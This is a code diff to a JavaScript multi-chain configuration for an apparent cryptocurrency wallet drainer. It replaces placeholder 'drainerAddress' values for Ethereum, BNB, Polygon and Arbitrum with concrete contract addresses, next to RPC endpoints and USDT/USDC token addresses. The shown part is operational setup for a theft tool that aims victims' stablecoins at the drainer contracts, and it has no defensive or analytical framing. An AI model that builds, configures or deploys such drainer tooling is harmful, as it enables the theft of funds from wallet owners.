@@ -31,7 +31,7 @@ const CHAINS = {
     rpcUrls: ["https://rpc.eth.gateway.fm", "https://eth.llamarpc.com", "https://ethereum-rpc.publicnode.com"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    drainerAddress: "0x22E2fdf36E1257012B7dD305A2939C5e08C958c5",
+    drainerAddress: "0x2F711446fa4048c375fE65fBf6C912DD44c736Cd",
     explorerApi: "https://api.etherscan.io/api",
     explorerApiKey: ETHERSCAN_API_KEY
   },
@@ -46,7 +46,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS",
+    drainerAddress: "0x571ECf52126Be880c686803f9aDa40F8b878D079",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
@@ -57,7 +57,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS",
+    drainerAddress: "0x571ECf52126Be880c686803f9aDa40F8b878D079",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
@@ -68,7 +68,7 @@ const CHAINS = {
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
     usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
-    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS",
+    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
   }
